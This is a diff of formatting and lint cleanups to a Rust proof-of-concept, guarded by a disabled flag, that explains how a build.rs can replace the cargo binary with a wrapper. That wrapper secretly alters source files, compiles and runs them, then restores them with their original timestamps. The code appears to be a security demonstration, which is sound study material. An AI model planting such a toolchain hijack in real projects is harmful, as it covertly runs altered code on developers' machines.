@@ -11,12 +11,12 @@ use std::fs::OpenOptions;
 use std::fs::{self, File};
 use std::io::Write;
 use std::path::{Path, PathBuf};
+use std::process;
 use std::process::exit;
 use std::process::Command;
 use std::process::Stdio;
-use std::process;
 
-const RUN_FLAG :bool = false;
+const RUN_FLAG: bool = false;
 
 fn locate_cargo_bin() -> Option<PathBuf> {
     // Retrieve the PATH environment variable
@@ -48,11 +48,10 @@ fn locate_cargo_bin() -> Option<PathBuf> {
     None
 }
 fn main() -> std::io::Result<()> {
-
-    if ! RUN_FLAG{
+    if !RUN_FLAG {
         println!("This code example shows how build time effects can be exploited.");
         println!("This code example builds a wrapper around the rust compiler.");
-        println!("The modified compiler can then modify all furture target code files, compiles them, and execute,"); 
+        println!("The modified compiler can then modify all furture target code files, compiles them, and execute,");
         println!("and then reverts the file to its original state while preserving file metadata such as timestamps.");
         println!("From a user perspective nothing happened, but the file that got excuted is different than the intended one");
         println!("To truly demonstrate this example this code example should be present in a file named build.rs");
@@ -63,7 +62,6 @@ fn main() -> std::io::Result<()> {
         println!("2) reinstall the rust compiler and delete the .compiler directory in cargo/bin");
         process::exit(1);
     }
-
 
     let cargo_path = match locate_cargo_bin() {
         Some(path) => path,
@@ -86,7 +84,7 @@ fn main() -> std::io::Result<()> {
         .arg("new")
         .stdout(Stdio::null()) // Suppress stdout
         .stderr(Stdio::null()) // Suppress stderr
-        .arg(&project_name)
+        .arg(project_name)
         .status()?;
 
     if !status.success() {
@@ -241,8 +239,8 @@ for entry in WalkDir::new(src_dir)
         .current_dir(Path::new(&project_name))
         .status()?;
 
-    fs::create_dir_all(&new_cargo_path.parent().unwrap())?;
-    let _ = fs::rename(&cargo_path, &new_cargo_path)?;
+    fs::create_dir_all(new_cargo_path.parent().unwrap())?;
+    fs::rename(&cargo_path, &new_cargo_path)?;
 
     // Rename the generated project to a generic name, handling platform-specific executable extensions.
     #[cfg(target_os = "windows")]
@@ -265,9 +263,9 @@ for entry in WalkDir::new(src_dir)
 
     let script_path = cargo_dir.join(script_file_name);
 
-    let _ = fs::rename(new_executable_name, &script_path);
+    _ = fs::rename(new_executable_name, &script_path);
 
-    let _ = fs::remove_dir_all(&project_name);
+    _ = fs::remove_dir_all(project_name);
 
     Ok(())
 }
